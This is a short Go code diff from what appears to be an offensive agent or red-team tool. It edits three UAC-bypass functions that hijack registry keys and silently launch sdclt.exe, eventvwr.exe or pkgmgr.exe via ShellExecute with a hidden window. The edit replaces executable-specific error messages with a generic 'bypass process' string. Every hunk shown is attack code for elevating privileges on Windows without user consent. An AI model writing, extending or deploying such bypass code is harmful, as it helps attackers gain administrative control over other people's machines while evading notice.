@@ -121,7 +121,7 @@ func uacBypassSdclt(command string) structs.CommandResult {
 	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
 	if err != nil {
 		cleanupSdcltKey()
-		return errorResult(output + fmt.Sprintf("Error launching sdclt.exe: %v", err))
+		return errorResult(output + fmt.Sprintf("Error launching bypass process: %v", err))
 	}
 	output += "[+] Launched sdclt.exe via ShellExecute\n"
 
@@ -179,7 +179,7 @@ func uacBypassEventvwr(command string) structs.CommandResult {
 	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
 	if err != nil {
 		cleanupEventvwrKey()
-		return errorResult(output + fmt.Sprintf("Error launching eventvwr.exe: %v", err))
+		return errorResult(output + fmt.Sprintf("Error launching bypass process: %v", err))
 	}
 	output += "[+] Launched eventvwr.exe via ShellExecute\n"
 
@@ -238,7 +238,7 @@ func uacBypassDismhost(command string) structs.CommandResult {
 	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
 	if err != nil {
 		cleanupDismhostKey(clsid)
-		return errorResult(output + fmt.Sprintf("Error launching pkgmgr.exe: %v", err))
+		return errorResult(output + fmt.Sprintf("Error launching bypass process: %v", err))
 	}
 	output += "[+] Launched pkgmgr.exe via ShellExecute\n"
 
